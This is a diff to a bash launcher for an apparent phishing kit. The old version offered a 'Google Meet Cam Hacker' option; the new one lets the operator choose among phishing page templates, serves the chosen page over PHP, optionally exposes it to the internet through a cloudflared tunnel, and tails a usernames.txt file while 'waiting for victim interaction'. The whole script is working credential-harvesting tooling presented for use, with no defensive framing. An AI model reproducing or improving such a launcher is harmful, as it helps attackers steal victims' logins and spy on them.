@@ -1,6 +1,5 @@
 #!/bin/bash
 
-SITE_DIR="sites/google_meet_cam"
 SERVER_DIR=".server/www"
 PORT=8080
 
@@ -35,8 +34,31 @@ function check_cloudflared() {
     fi
 }
 
+function choose_site() {
+    echo -e "${CYAN}📂 Available Templates:${RESET}"
+    SITE_DIRS=()
+    index=1
+
+    for dir in sites/*/; do
+        site_name=$(basename "$dir")
+        echo -e "[$index] ${site_name//_/ }"
+        SITE_DIRS+=("$dir")
+        ((index++))
+    done
+
+    read -p $'\nChoose a site template by number: ' choice
+    if [[ "$choice" =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#SITE_DIRS[@]} ]]; then
+        SITE_DIR="${SITE_DIRS[$((choice - 1))]}"
+        echo -e "${GREEN}[+] Selected template: ${SITE_DIR}${RESET}"
+    else
+        echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
+        exit 1
+    fi
+}
+
 function start_php_server() {
     mkdir -p $SERVER_DIR
+    rm -rf $SERVER_DIR/*
     cp -r $SITE_DIR/* $SERVER_DIR/
     cd $SERVER_DIR && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
     echo -e "${GREEN}[+] PHP server started at http://127.0.0.1:$PORT${RESET}"
@@ -67,36 +89,31 @@ function start_cloudflared() {
     fi
     echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
     echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
+    tail -f $SERVER_DIR/usernames.txt 2>/dev/null &
     while true; do sleep 1; done
 }
 
-# Run launcher
+# Execution starts here
 banner
 check_internet
 check_cloudflared
+choose_site
 
-echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
-read -p $'Choose an option: ' opt
+echo -e "${CYAN}Choose tunneling option:${RESET}"
+echo "[1] Localhost"
+echo "[2] Cloudflared"
+read -p $'Your choice: ' tunnel
 
-if [[ $opt == 1 ]]; then
-    echo -e "${CYAN}Choose tunneling option:${RESET}"
-    echo "[1] Localhost"
-    echo "[2] Cloudflared"
-    read -p $'Your choice: ' tunnel
+start_php_server
 
-    start_php_server
-
-    if [[ $tunnel == 1 ]]; then
-        echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
-        echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
-        echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
-        while true; do sleep 1; done
-    elif [[ $tunnel == 2 ]]; then
-        start_cloudflared
-    else
-        echo -e "${RED}[!] Invalid tunneling option.${RESET}"
-        exit 1
-    fi
+if [[ $tunnel == 1 ]]; then
+    echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
+    echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
+    tail -f $SERVER_DIR/usernames.txt 2>/dev/null &
+    while true; do sleep 1; done
+elif [[ $tunnel == 2 ]]; then
+    start_cloudflared
 else
-    echo -e "${RED}[!] Invalid option${RESET}"
+    echo -e "${RED}[!] Invalid tunneling option.${RESET}"
+    exit 1
 fi
